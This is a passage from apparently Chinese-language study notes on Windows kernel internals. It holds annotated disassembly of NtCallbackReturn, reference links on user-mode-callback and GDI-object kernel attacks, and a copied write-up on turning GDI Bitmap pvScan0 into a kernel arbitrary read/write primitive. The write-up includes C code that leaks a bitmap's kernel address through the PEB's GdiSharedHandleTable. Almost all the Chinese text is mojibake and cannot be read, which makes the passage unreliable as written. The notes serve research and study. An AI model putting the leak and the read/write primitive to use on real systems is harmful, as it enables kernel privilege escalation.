fs:_KPCR.PrcbData.EspBaseShadow, eax <span class="comment">// =================================</span></span><br><span class="line">.text:<span class="number">0057</span>DA35                                         <span class="comment">// è¿™é‡Œæ¯”è¾ƒæœ‰æ„æ€ï¼Œè¿™ä¸ªä½ç½®æœ‰ç‚¹åƒç³»ç»Ÿè°ƒç”¨æ—¶å€™çš„ TSS.ESP0 ä½ç½®</span></span><br><span class="line">.text:<span class="number">0057</span>DA35                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0057</span>DA35                                         <span class="comment">// v86æ¨¡å¼ï¼š  EspBaseShadow æŒ‡å‘ TrapFrame.v86Gs+4</span></span><br><span class="line">.text:<span class="number">0057</span>DA35                                         <span class="comment">// év86æ¨¡å¼ï¼šEspBaseShadow æŒ‡å‘ TrapFrame.v86Es == TrapFrame.Ss+4</span></span><br><span class="line">.text:<span class="number">0057</span>DA35                                         <span class="comment">// =============================================================</span></span><br><span class="line">.text:<span class="number">0057</span>DA3B                 jnz     <span class="keyword">short</span> loc_57DA47 <span class="comment">// åˆ‡æ¢å›ä¹‹å‰è¿›å…¥ 3 ç¯å‰çš„ TrapFrameï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</span></span><br><span class="line">.text:<span class="number">0057</span>DA3D                 mov     edx, large fs:_KPCR.___u0.NtTib.SubSystemTib</span><br><span class="line">.text:<span class="number">0057</span>DA44                 mov     [edx+_NT_TIB.StackBase], eax <span class="comment">// æ›´æ–°æ ˆåº•ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</span></span><br><span class="line">.text:<span class="number">0057</span>DA44                                         <span class="comment">// ä½¿å…¶ä¸º TrapFrame ä¸­åˆšæ‰é€‰å¥½çš„esp0çš„ä½ç½®</span></span><br><span class="line">.text:<span class="number">0057</span>DA47</span><br><span class="line">.text:<span class="number">0057</span>DA47 loc_57DA47:                             <span class="comment">// CODE XREF: NtCallbackReturn(x,x,x)+6Fâ†‘j</span></span><br><span class="line">.text:<span class="number">0057</span>DA47                 mov     [ebx+_KTHREAD.TrapFrame], edi <span class="comment">// åˆ‡æ¢å›ä¹‹å‰è¿›å…¥ 3 ç¯å‰çš„ TrapFrameï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</span></span><br><span class="line">.text:<span class="number">0057</span>DA4A                 pop     [ebx+_KTHREAD.StackBase]</span><br><span class="line">.text:<span class="number">0057</span>DA4D                 pop     [ebx+_KTHREAD.StackLimit]</span><br><span class="line">.text:<span class="number">0057</span>DA50                 pop     edx</span><br><span class="line">.text:<span class="number">0057</span>DA51                 pop     [ebx+_KTHREAD.InitialStack]</span><br><span class="line">.text:<span class="number">0057</span>DA54                 mov     esp, edx</span><br><span class="line">.text:<span class="number">0057</span>DA56                 sti</span><br><span class="line">.text:<span class="number">0057</span>DA57                 mov     eax, ebp        <span class="comment">// Status</span></span><br><span class="line">.text:<span class="number">0057</span>DA59                 pop     edi</span><br><span class="line">.text:<span class="number">0057</span>DA5A                 pop     esi</span><br><span class="line">.text:<span class="number">0057</span>DA5B                 pop     ebx</span><br><span class="line">.text:<span class="number">0057</span>DA5C                 pop     ebp</span><br><span class="line">.text:<span class="number">0057</span>DA5D                 retn    <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0057</span>DA60 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0057</span>DA60</span><br><span class="line">.text:<span class="number">0057</span>DA60 loc_57DA60:                             <span class="comment">// CODE XREF: NtCallbackReturn(x,x,x)+43â†‘j</span></span><br><span class="line">.text:<span class="number">0057</span>DA60                 mov     ecx, <span class="number">0B</span>h</span><br><span class="line">.text:<span class="number">0057</span>DA65                 mov     esi, [ebx+<span class="number">6</span>Ch]</span><br><span class="line">.text:<span class="number">0057</span>DA68                 test    byte ptr [esi+<span class="number">72</span>h], <span class="number">2</span></span><br><span class="line">.text:<span class="number">0057</span>DA6C                 mov     edx, edi</span><br><span class="line">.text:<span class="number">0057</span>DA6E                 lea     edi, [edi+<span class="number">50</span>h]</span><br><span class="line">.text:<span class="number">0057</span>DA71                 jz      <span class="keyword">short</span> loc_57DA76</span><br><span class="line">.text:<span class="number">0057</span>DA73                 add     ecx, <span class="number">4</span></span><br><span class="line">.text:<span class="number">0057</span>DA76</span><br><span class="line">.text:<span class="number">0057</span>DA76 loc_57DA76:                             <span class="comment">// CODE XREF: NtCallbackReturn(x,x,x)+A5â†‘j</span></span><br><span class="line">.text:<span class="number">0057</span>DA76                 lea     esi, [esi+<span class="number">50</span>h]</span><br><span class="line">.text:<span class="number">0057</span>DA79                 rep movsd</span><br><span class="line">.text:<span class="number">0057</span>DA7B                 mov     ecx, [ebx+<span class="number">20</span>h]</span><br><span class="line">.text:<span class="number">0057</span>DA7E                 mov     edi, edx</span><br><span class="line">.text:<span class="number">0057</span>DA80                 jmp     <span class="keyword">short</span> loc_57DA11</span><br><span class="line">.text:<span class="number">0057</span>DA82 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0057</span>DA82</span><br><span class="line">.text:<span class="number">0057</span>DA82 loc_57DA82:                             <span class="comment">// CODE XREF: NtCallbackReturn(x,x,x)+4Dâ†‘j</span></span><br><span class="line">.text:<span class="number">0057</span>DA82                 mov     esi, [ebx+_KTHREAD.TrapFrame]</span><br><span class="line">.text:<span class="number">0057</span>DA85                 mov     edx, [esi+_KTRAP_FRAME.Dr0]</span><br><span class="line">.text:<span class="number">0057</span>DA88                 mov     [edi+_KTRAP_FRAME.Dr0], edx</span><br><span class="line">.text:<span class="number">0057</span>DA8B                 mov     edx, [esi+_KTRAP_FRAME.Dr1]</span><br><span class="line">.text:<span class="number">0057</span>DA8E                 mov     [edi+_KTRAP_FRAME.Dr1], edx</span><br><span class="line">.text:<span class="number">0057</span>DA91                 mov     edx, [esi+_KTRAP_FRAME.Dr2]</span><br><span class="line">.text:<span class="number">0057</span>DA94                 mov     [edi+_KTRAP_FRAME.Dr2], edx</span><br><span class="line">.text:<span class="number">0057</span>DA97                 mov     edx, [esi+_KTRAP_FRAME.Dr3]</span><br><span class="line">.text:<span class="number">0057</span>DA9A                 mov     [edi+_KTRAP_FRAME.Dr3], edx</span><br><span class="line">.text:<span class="number">0057</span>DA9D                 mov     edx, [esi+_KTRAP_FRAME.Dr6]</span><br><span class="line">.text:<span class="number">0057</span>DAA0                 mov     [edi+_KTRAP_FRAME.Dr6], edx</span><br><span class="line">.text:<span class="number">0057</span>DAA3                 mov     edx, [esi+_KTRAP_FRAME.Dr7]</span><br><span class="line">.text:<span class="number">0057</span>DAA6                 mov     [edi+_KTRAP_FRAME.Dr7], edx</span><br><span class="line">.text:<span class="number">0057</span>DAA9                 jmp     loc_57DA1B      <span class="comment">// æ­¤å¤„å­˜æ”¾CurrentThread.StackBase</span></span><br><span class="line">.text:<span class="number">0057</span>DAAE <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0057</span>DAAE</span><br><span class="line">.text:<span class="number">0057</span>DAAE loc_57DAAE:                             <span class="comment">// CODE XREF: NtCallbackReturn(x,x,x)+Eâ†‘j</span></span><br><span class="line">.text:<span class="number">0057</span>DAAE                 mov     eax, <span class="number">0</span>C0000258h <span class="comment">// return STATUS_NO_CALLBACK_ACTIVE</span></span><br><span class="line">.text:<span class="number">0057</span>DAB3                 retn    <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">0057</span>DAB3 _NtCallbackReturn@<span class="number">12</span> endp</span><br></pre></td></tr></table></figure>





<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/revercc/p/14656013.html">KeUserModeCallbackå‡½æ•°</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/184233">KeUserModeCallback è¿‡ç¨‹è¯¦ç»†åˆ†æ</a></p>
<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-104918.htm">KeUserModeCallbackç”¨æ³•è¯¦è§£-çœ‹é›ª</a></p>
<p><a target="_blank" rel="noopener" href="https://www.stormshield.com/news/how-to-run-userland-code-from-the-kernel-on-windows/">How to run userland code from the kernel on Windows</a></p>
<p><a target="_blank" rel="noopener" href="https://j00ru.vexillium.org/2010/09/kernel-exploitation-r0-to-r3-transitions-via-keusermodecallback/">Kernel exploitation â€“ r0 to r3 transitions via KeUserModeCallback</a></p>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/72007033/how-to-monitor-kernel-callbacks">How to monitor Kernel callbacks</a></p>
<p><a target="_blank" rel="noopener" href="https://conference.hitb.org/hitbsecconf2018ams/materials/D2T2%20-%20Rancho%20Han%20-%20Pwning%20The%20Windows%20Kernel.pdf">Over the Edge Pwning the windows kernel</a></p>
<p><a target="_blank" rel="noopener" href="http://www.vxjump.net/files/security_research/win10_KeUserModeCallback.pdf">Win10ä¸‹æ—¥è½è¥¿å±±çš„ KeUserModeCallbackæ”»å‡»æ–¹å¼</a></p>
<p><a target="_blank" rel="noopener" href="http://hacky.ren/2022/04/23/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81%EF%BC%882022.4.16-4.22%EF%BC%89/">ç»¿ç›Ÿç§‘æŠ€-æ¯å‘¨è“å†›æŠ€æœ¯æ¨é€ï¼ˆ2022.4.16-4.22ï¼‰å­¦ä¹ </a></p>
<p><a target="_blank" rel="noopener" href="https://dennisbabkin.com/blog/?t=depths-of-windows-apc-aspects-of-asynchronous-procedure-call-internals-from-kernel-mode">Aspects of internals of the Asynchronous Procedure Calls from the kernel mode.</a></p>
<p><a target="_blank" rel="noopener" href="https://www.matteomalvica.com/minutes/windows_kernel/">windows kernel internals</a></p>
<p><a target="_blank" rel="noopener" href="https://ti.qianxin.com/blog/articles/elevation-of-privilege-bug%20(CVE-2021-1732)-analysis/">ã€çº¢é›¨æ»´æ²™ç®±æ”¯æŒææƒæ¼æ´åˆ©ç”¨æ£€æµ‹ã€‘CVE-2021-1732 Microsoft Windowsææƒæ¼æ´åˆ†æ</a></p>
<p><a target="_blank" rel="noopener" href="https://br-sn.github.io/Removing-Kernel-Callbacks-Using-Signed-Drivers/">Removing Kernel Callbacks Using Signed Drivers</a></p>
<p><a target="_blank" rel="noopener" href="https://pre.empt.dev/posts/maelstrom-edr-kernel-callbacks-hooks-and-callstacks/">Maelstrom: EDR Kernel Callbacks, Hooks, and Call Stacks</a></p>
<p><a target="_blank" rel="noopener" href="https://www.zybuluo.com/zoand/note/1392885">awesome-windows-kernel-security-development</a></p>
<h3 id="4-8-è°ƒç”¨å…¨æ™¯å›¾"><a href="#4-8-è°ƒç”¨å…¨æ™¯å›¾" class="headerlink" title="4.8 è°ƒç”¨å…¨æ™¯å›¾"></a>4.8 è°ƒç”¨å…¨æ™¯å›¾</h3><p><img data-src="https://s2.loli.net/2022/10/18/6McwEly7xYA9N4a.png" alt="38.png"></p>
<h2 id="5-åç»­å·¥ä½œ"><a href="#5-åç»­å·¥ä½œ" class="headerlink" title="5 åç»­å·¥ä½œ"></a>5 åç»­å·¥ä½œ</h2><ol>
<li>CreateWindowsEx é€†å‘åˆ†æã€‚è¿™æ˜¯åç»­å·¥ä½œï¼Œå‚è€ƒæµ·å“¥ç«å“¥è§†é¢‘ã€‚</li>
<li>ä»¥ä¸‹ <a target="_blank" rel="noopener" href="https://fuzzysecurity.com/tutorials.html">19 ç§æ¼æ´åˆ†æ</a>ã€‚ä¸»è¦æ¶‰åŠ User-Mode CallBack, Kernel Leaks, tagWND â€¦</li>
</ol>
<p><img data-src="https://s2.loli.net/2022/10/18/5hH8vwjNOB9Vc63.png" alt="40.png"></p>
<p>ç»“åˆä»¥ä¸‹çš„ä¸€ç¯‡æ–‡ç« ï¼š</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://xiaodaozhi.com/exploit/29.html">é€šè¿‡ Windows ç”¨æˆ·æ¨¡å¼å›è°ƒå®æ–½çš„å†…æ ¸æ”»å‡»</a></li>
<li><a target="_blank" rel="noopener" href="https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2011/BH_US_11_Mandt_win32k_Slides.pdf">Kernel Attacks through User Mode Callbacks-2011</a></li>
<li><a target="_blank" rel="noopener" href="https://downloads.volatilityfoundation.org/omfw/2012/OMFW2012_Ligh.pdf">OMFW-Malware in the Windows GUI Subsystem</a></li>
</ul>
<h2 id="6-GDI-å¯¹è±¡åˆ†æ"><a href="#6-GDI-å¯¹è±¡åˆ†æ" class="headerlink" title="6 GDI å¯¹è±¡åˆ†æ"></a>6 GDI å¯¹è±¡åˆ†æ</h2><p>è¿™éƒ¨åˆ†æ˜¯åç»­å·¥ä½œã€‚</p>
<p>GDI å¯¹è±¡æ»¥ç”¨å¾ˆé‡è¦ï¼Œè¿˜æ¶‰åŠåˆ°å†…æ ¸ä¿¡æ¯æ³„éœ²ã€‚ï¼ˆä»¥ä¸‹æ–‡ç« åœ¨ Safari <strong>Tab Space</strong> æ’ä»¶ä¸‹æ ‡ç­¾ä¸º GDI Objectsï¼‰</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://ryze-t.com/2021/11/23/GDI-%E5%AF%B9%E8%B1%A1%E5%88%A9%E7%94%A8/">GDI å¯¹è±¡åˆ©ç”¨</a></li>
<li>å¤§éƒ¨åˆ†æ–‡ç« éƒ½æ˜¯å‚è€ƒè¿™ä¸ªæŠ¥å‘Šâ€”â€”<a target="_blank" rel="noopener" href="https://conference.hitb.org/hitbsecconf2018ams/materials/D1%20COMMSEC%20-%20Saif%20Elsherei%20and%20Ian%20Kronquist%20-%20The%20Life%20&%20Death%20of%20Kernel%20Object%20Abuse.pdf">The Life And Death of Kernel Object Abuse</a></li>
<li><a target="_blank" rel="noopener" href="https://saturn35.com/2019/07/25/20190725-1/">æ»¥ç”¨GDIå¯¹è±¡</a></li>
<li><a href="">Windows GDI Bitmap</a></li>
<li><a target="_blank" rel="noopener" href="http://www.vxjump.net/files/seccon/exp-in-gdi.pdf">GDIé­”æœ¯ï¼šæ¼æ´åˆ©ç”¨ä¸­çš„åˆ©å™¨</a></li>
<li><a target="_blank" rel="noopener" href="https://xiaodaozhi.com/exploit/42.html">ä» CVE-2016-0165 è¯´èµ·ï¼šåˆ†æã€åˆ©ç”¨å’Œæ£€æµ‹ï¼ˆä¸­ï¼‰</a></li>
<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-225436.htm">Bitmapè½¶äº‹ï¼šWindows 10çºªå¿µç‰ˆåçš„GDIå¯¹è±¡æ³„éœ²</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/156519">Windowsç‰¹æƒæå‡ï¼šGDI Bitmapæ»¥ç”¨</a></li>
<li><a target="_blank" rel="noopener" href="https://fuzzysecurity.com/tutorials/expDev/21.html">Part 17: Kernel Exploitation -&gt; GDI Bitmap Abuse (Win7-10 32&#x2F;64bit)</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.quarkslab.com/reverse-engineering-the-win32k-type-isolation-mitigation.html">Reverse Engineering the Win32k Type Isolation Mitigation</a>â€”â€”å…¶å‚è€ƒæ–‡ç« å¾ˆé‡è¦</li>
<li><a target="_blank" rel="noopener" href="https://labs.bluefrostsecurity.de/files/Abusing_GDI_for_ring0_exploit_primitives_Evolution_Slides.pdf">Abusing GDI for ringo exploit primitives: Evolution</a></li>
<li><a target="_blank" rel="noopener" href="https://www.coresecurity.com/sites/default/files/private-files/publications/2016/10/Abusing-GDI-Reloaded-ekoparty-2016_0.pdf">Abusing GDI for ringo exploit primitives: RELOADED</a></li>
<li><a target="_blank" rel="noopener" href="https://sensepost.com/blog/2017/abusing-gdi-objects-for-ring0-primitives-revolution/">Abusing GDI Objects for ring0 Primitives Revolution</a></li>
<li><a target="_blank" rel="noopener" href="http://theevilbit.blogspot.com/2017/10/abusing-gdi-objects-bitmap-objects-size.html">Abusing GDI objects: Bitmap objectâ€™s size in the kernel pool</a></li>
</ul>
<p>Dump <a target="_blank" rel="noopener" href="http://ryze-t.com/2021/11/23/GDI-%E5%AF%B9%E8%B1%A1%E5%88%A9%E7%94%A8/">GDI å¯¹è±¡åˆ©ç”¨</a>ï¼š</p>
<p><strong>0x00 å‰è¨€</strong></p>
<p>æ™®é€šæ˜¾ç¤ºå™¨æ˜¯ç”±åƒç´ ç‚¹æ„æˆçš„ï¼Œæ˜¾ç¤ºæ—¶é‡‡ç”¨æ‰«æçš„æ–¹æ³•ï¼Œè¿™ç§æ˜¾ç¤ºå™¨è¢«ç§°ä¸ºä½æ˜ åƒè®¾å¤‡ã€‚ä½æ˜ è±¡ï¼Œå°±æ˜¯æŒ‡ä¸€ä¸ªäºŒç»´çš„åƒç´ çŸ©é˜µï¼Œ<strong>Bitmap(ä½å›¾)</strong> å°±æ˜¯é‡‡ç”¨ä½æ˜ è±¡æ–¹æ³•æ˜¾ç¤ºå’Œå­˜å‚¨çš„å›¾è±¡ã€‚</p>
<p>å½“ä¸€å¹…å›¾ä¸­æ¯ä¸ªåƒç´ ç‚¹èµ‹äºˆä¸åŒçš„ RGB å€¼æ—¶ï¼Œå°±èƒ½å‘ˆç°ä¸åŒçš„é¢œè‰²ï¼Œç”¨æ¥æŒ‡å®šå¯¹åº”é¢œè‰²çš„ RGB è¡¨å°±è¢«ç§°ä¸º<strong>Palette(è°ƒè‰²æ¿</strong> )ã€‚</p>
<h3 id="1-1-BitmapåŸºç¡€æ¦‚å¿µ"><a href="#1-1-BitmapåŸºç¡€æ¦‚å¿µ" class="headerlink" title="1.1 BitmapåŸºç¡€æ¦‚å¿µ"></a>1.1 BitmapåŸºç¡€æ¦‚å¿µ</h3><p><strong>CreateBitmap</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HBITMAP <span class="title">CreateBitmap</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] <span class="keyword">int</span>        nWidth,   <span class="comment">// ä½å›¾å®½åº¦ï¼Œåƒç´ ä¸ºå•ä½</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in] <span class="keyword">int</span>        nHeight,  <span class="comment">// ä½å›¾é«˜åº¦ï¼Œåƒç´ ä¸ºå•ä½</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in] UINT       nPlanes,  <span class="comment">// è®¾å¤‡ä½¿ç”¨çš„é¢œè‰²ä½é¢æ•°</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in] UINT       nBitCount, <span class="comment">// ç”¨æ¥åŒºåˆ†å•ä¸ªåƒç´ ç‚¹é¢œè‰²çš„ä½æ•°</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in] <span class="keyword">const</span> VOID *lpBits   <span class="comment">// æŒ‡å‘é¢œè‰²æ•°æ®æ•°ç»„çš„æŒ‡é’ˆ</span></span></span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœæˆåŠŸè¿”å›åˆ›å»ºä½å›¾çš„å¥æŸ„ï¼Œå¦‚æœåˆ›å»ºBitMapæ—¶ lpBitsä¸æŒ‡å®š åˆ™ä¼šé¢å¤–åˆ›å»ºæ± å—å¤„ç†PvScan0ã€‚</p>
<p><strong>SURFACE OBJECT</strong></p>
<p>éšç€ä½å›¾ä¸€æ ·è¢«åˆ›å»ºçš„è¿˜æœ‰ SURFACE OBJECT</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  BASEOBJECT64 BaseObject; <span class="comment">// 0x00</span></span><br><span class="line">  SURFOBJ64 SurfObj; <span class="comment">// 0x18</span></span><br><span class="line">  [...]</span><br><span class="line">&#125; SURFACE64;</span><br></pre></td></tr></table></figure>

<p>å®ƒåŒ…å«äº†ä¸¤ä¸ªç»“æ„ä½“ï¼š BASEOBJECT å’Œ SURFOBJã€‚SURFOBJ.pvScan0 è¿˜æŒ‡å‘ä¸€å—åä¸º Pixel Data çš„æ•°æ®åŒºã€‚</p>
<p><a target="_blank" rel="noopener" href="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100213.png"><img data-src="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100213.png" alt="img"></a></p>
<p>SURFOBJ å®˜æ–¹æœ‰è¯¦ç»†çš„å®šä¹‰ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  ULONG64 dhsurf; <span class="comment">// 0x00</span></span><br><span class="line">  ULONG64 hsurf; <span class="comment">// 0x08</span></span><br><span class="line">  ULONG64 dhpdev; <span class="comment">// 0x10</span></span><br><span class="line">  ULONG64 hdev; <span class="comment">// 0x18</span></span><br><span class="line">  SIZEL sizlBitmap; <span class="comment">// 0x20</span></span><br><span class="line">  ULONG64 cjBits; <span class="comment">// 0x28</span></span><br><span class="line">  ULONG64 pvBits; <span class="comment">// 0x30</span></span><br><span class="line">  ULONG64 pvScan0; <span class="comment">// 0x38</span></span><br><span class="line">  ULONG32 lDelta; <span class="comment">// 0x40</span></span><br><span class="line">  ULONG32 iUniq; <span class="comment">// 0x44</span></span><br><span class="line">  ULONG32 iBitmapFormat; <span class="comment">// 0x48</span></span><br><span class="line">  USHORT iType; <span class="comment">// 0x4C</span></span><br><span class="line">  USHORT fjBitmap; <span class="comment">// 0x4E</span></span><br><span class="line">&#125; SURFOBJ64; <span class="comment">// sizeof = 0x50</span></span><br></pre></td></tr></table></figure>

<p><strong>GetbitmapBits å’Œ SetBitmapBits</strong></p>
<p>Pixel Data å¯ä»¥ç”± GetbitmapBits å’Œ SetBitmapBits æ¥æ§åˆ¶è¯»å†™ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">GetBitmapBits</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]  HBITMAP hbit,   <span class="comment">// ä½å›¾çš„å¥æŸ„</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in]  LONG    cb,     <span class="comment">// è¦ä»ä½å›¾å¤åˆ¶åˆ°ç¼“å†²åŒºçš„å­—èŠ‚æ•°</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [out] LPVOID  lpvBits <span class="comment">// æŒ‡å‘ç¼“å†²åŒºçš„æŒ‡é’ˆ</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"><span class="function">LONG <span class="title">SetBitmapBits</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] HBITMAP    hbm,    <span class="comment">// ä½å›¾çš„å¥æŸ„</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in] DWORD      cb,     <span class="comment">// æŒ‡å®šå‚æ•°lpBitsæŒ‡å‘çš„æ•°ç»„çš„å­—èŠ‚æ•°</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in] <span class="keyword">const</span> VOID *pvBits <span class="comment">// æŒ‡å‘åŒ…å«æŒ‡å®šä½å›¾é¢œè‰²æ•°æ®çš„å­—èŠ‚æ•°ç»„çš„æŒ‡é’ˆ</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h3 id="1-2-Bitmap-ä»»æ„åœ°å€è¯»å†™ï¼ˆ-lt-1607ï¼‰"><a href="#1-2-Bitmap-ä»»æ„åœ°å€è¯»å†™ï¼ˆ-lt-1607ï¼‰" class="headerlink" title="1.2 Bitmap ä»»æ„åœ°å€è¯»å†™ï¼ˆ&lt;1607ï¼‰"></a>1.2 Bitmap ä»»æ„åœ°å€è¯»å†™ï¼ˆ&lt;1607ï¼‰</h3><p>Pixel Data å¯ä»¥ç”± GetbitmapBits å’Œ SetBitmapBits æ¥æ§åˆ¶è¯»å†™ã€‚pvScan0 å’Œå®ƒæŒ‡å‘çš„æ•°æ®åŒº Pixel Data éƒ½åœ¨å†…æ ¸ç©ºé—´ï¼Œå› æ­¤åˆ©ç”¨GetbitmapBits å’Œ SetBitmapBits å°±å¯ä»¥åšåˆ°å†…æ ¸ç©ºé—´çš„è¯»å†™ï¼Œä½†æ˜¯å¹¶ä¸èƒ½åšåˆ°ä»»æ„åœ°å€è¯»å†™ã€‚</p>
<p>å¦‚æœå­˜åœ¨ä¸€æ¬¡ä»»æ„åœ°å€å†™çš„æœºä¼šï¼Œå°±å¯ä»¥é€šè¿‡ä¿®æ”¹ pvScan0 æ¥è·å¾—ä»»æ„åœ°å€è¯»å†™çš„èƒ½åŠ›ã€‚</p>
<p><strong>è·å– pvScan0 åœ°å€çš„æ–¹æ³•</strong></p>
<ol>
<li>NtCurrentTeb æ¥è·å¾— teb çš„åŸºå€</li>
<li>x64 ä¸‹ teb åç§» 0x60 è·å¾— peb çš„åŸºå€</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100217.png"><img data-src="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100217.png" alt="img"></a></p>
<ol>
<li>peb 0xf8 åç§»å¤„è·å¾— GdiSharedHandleTable åœ°å€</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100219.png"><img data-src="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100219.png" alt="img"></a></p>
<ol>
<li>GdiSharedHandleTable æ˜¯ä¸€ä¸ª GDICELL ç»“æ„ä½“æ•°ç»„ï¼Œæˆå‘˜å¯¹åº”è¿›ç¨‹ä¸­çš„æ¯ä¸ªGDIå¯¹è±¡ï¼Œæ•°ç»„ç´¢å¼•æ˜¯CreateBitmap è¿”å›çš„å¥æŸ„ hBitmapçš„ä½åå…­ä½ï¼Œå³ <code>index = hBitmap &amp; 0xFFFF</code></li>
<li>GDICELL ç»“æ„å¦‚ä¸‹ï¼š</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">GDI_CELL</span>&#123;</span></span><br><span class="line">  PVOID64 pKernelAddress; <span class="comment">// 0x00</span></span><br><span class="line">  USHORT wProcessId; <span class="comment">// 0x08</span></span><br><span class="line">  USHORT wCount; <span class="comment">// 0x0a</span></span><br><span class="line">  USHORT wUpper; <span class="comment">// 0x0c</span></span><br><span class="line">  USHORT wType; <span class="comment">// 0x0e</span></span><br><span class="line">  PVOID64 pUserAddress; <span class="comment">// 0x10</span></span><br><span class="line">&#125; GDICELL64; <span class="comment">// sizeof = 0x18</span></span><br></pre></td></tr></table></figure>

<p>â€‚â€‚â€‚â€‚<code>pKernelAddress = PEB.GdiSharedHandleTable + (handle &amp; 0xffff) * sizeof(GDICELL64)</code></p>
<ol>
<li>pKernelAddress æŒ‡å‘ BASEOBJECT ï¼ŒSURFOBJ åœ¨åç§» 0x18 å¤„ï¼Œ<code>SURFOBJ = BASEOBJECT + 0x18</code></li>
<li>pvScan0 åœ¨ SURFOBJ 0x38 åç§»å¤„ï¼Œ<code>pvScan0 = SURFOBJ + 0x38</code></li>
</ol>
<p>æ•´ä½“ä»£ç ä¸ºï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DWORD64 tebAddr = NtCurrentTeb();</span><br><span class="line"></span><br><span class="line">DWORD64 pebAddr = *(PDWORD64)((PUCHAR)tebAddr + <span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">DWORD64 gdiSharedHandleTableAddr = *(PDWORD64)((PUCHAR)pebAddr + <span class="number">0xf8</span>);</span><br><span class="line"></span><br><span class="line">DWORD64 pKernelAddress = gdiSharedHandleTableAddr  + ((DWORD64) hBitmap &amp; <span class="number">0xffff</span>) * <span class="number">0x18</span>;</span><br><span class="line"></span><br><span class="line">DWORD64 surfObj = *(PDWORD64)pKernelAddress +<span class="number">0x18</span>;</span><br><span class="line"></span><br><span class="line">DWORD64 pvScan0Addr = surfObj + <span class="number">0x38</span>;</span><br></pre></td></tr></table></figure>



<p><strong>æ•´ä½“åˆ©ç”¨æ€è·¯</strong></p>
<ol>
